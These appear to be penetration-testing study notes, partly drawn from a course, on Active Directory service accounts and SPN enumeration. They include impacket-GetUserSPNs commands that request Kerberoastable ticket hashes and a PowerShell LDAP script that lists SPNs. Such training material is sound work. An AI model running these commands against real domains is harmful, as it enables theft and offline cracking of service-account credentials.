#### Authenticated
Retrieve accounts that are vulnerable to this attack
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip DC1.scrm.local
```
Then we can extract the hashes as follows:
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
```
Examples:
[[Scramble#^b7b22a]]

An alternative to attacking a domain user account is to target so-called service accounts, which may also be members of high value groups.

When an application is executed, it must always do so in the context of an operating system user. If a user launches an application, that user account defines the context. However, services launched by the system itself use the context based on a _Service Account_.

In other words, isolated applications can use a set of predefined service accounts: _LocalSystem_, _LocalService_, and _NetworkService_. For more complex applications, a domain user account may be used to provide the needed context while still having access to resources inside the domain.

When applications like Exchange, SQL, or Internet Information Services (IIS) are integrated into Active Directory, a unique service instance identifier known as a _Service Principal Name_ (SPN) is used to associate a service on a specific server to a service account in Active Directory.

_Managed Service Accounts_, introduced with Windows Server 2008 R2, were designed for complex applications which require tighter integration with Active Directory. Larger applications like SQL and Microsoft Exchange often require server redundancy when running to guarantee availability, but Managed Service Accounts cannot support this. To remedy this, _Group Managed Service Accounts_ were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher. Because of this, many organizations still rely on basic Service Accounts.

By enumerating all registered SPNs in the domain, we can obtain the IP address and port number of applications running on servers integrated with the target Active Directory, limiting the need for a broad port scan.

Since the information is registered and stored in Active Directory, it is present on the domain controller. To obtain the data, we will again query the domain controller in search of specific service principal names.

While Microsoft has not documented a list of searchable SPN's there are extensive lists [available online](https://adsecurity.org/?page_id=183).

For example, let's update our PowerShell enumeration script to filter the _serviceprincipalname_ property for the string _*http*_, indicating the presence of a registered web server:

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

This search returns a number of results, and although they could be further filtered, we can easily spot relevant information:

```
Name                    Value     
----                    -----     
givenname               {iis_service}    
samaccountname          {iis_service}  
cn                      {iis_service}    
pwdlastset              {131623309820953450}  
whencreated             {05/02/2018 19.03.02} 
badpwdcount             {0}  
displayname             {iis_service}  
lastlogon               {131624786130434963}   
samaccounttype          {805306368}   
countrycode             {0} 
objectguid              {201 74 156 103 125 89 254 67 146 40 244 7 212 176 32 11}  
usnchanged              {28741}  
whenchanged             {07/02/2018 12.08.56}   
name                    {iis_service}   
objectsid               {1 5 0 0 0 0 0 5 21 0 0 0 202 203 185 181 144 182 205 192 58 2
logoncount              {3}  
badpasswordtime         {0}  
accountexpires          {9223372036854775807}   
primarygroupid          {513}   
objectcategory          {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}  
userprincipalname       {iis_service@corp.com} 
useraccountcontrol      {590336}   
dscorepropagationdata   {01/01/1601 00.00.00} 
serviceprincipalname    {HTTP/CorpWebServer.corp.com} 
distinguishedname       

{CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com
objectclass             {top, person, organizationalPerson, user} 
usncreated              {12919}                  
lastlogontimestamp      {131624773644330799}     
adspath                 {LDAP://CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com}    
...    
```

Based on the output, one attribute name, _samaccountname_ is set to _iis_service_, indicating the presence of a web server and _serviceprincipalname_ is set to _HTTP/CorpWebServer.corp.com_. This all seems to suggest the presence of a web server.

Let's attempt to resolve "CorpWebServer.corp.com" with nslookup:

```
PS C:\Users\offsec.CORP> nslookup CorpWebServer.corp.com
Server:  UnKnown
Address:  192.168.1.110

Name:    corpwebserver.corp.com
Address:  192.168.1.110
```

> Listing 28 - Nslookup of serviceprincipalname entry

From the results, it's clear that the hostname resolves to an internal IP address, namely the IP address of the domain controller.

If we browse this IP, we find a default IIS web server as shown in Figure 2.

![Figure 2: IIS web server at CorpWebServer.corp.com](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/ad/63193fe21ac18b8b57f193ac10a42558-ad04f.png)



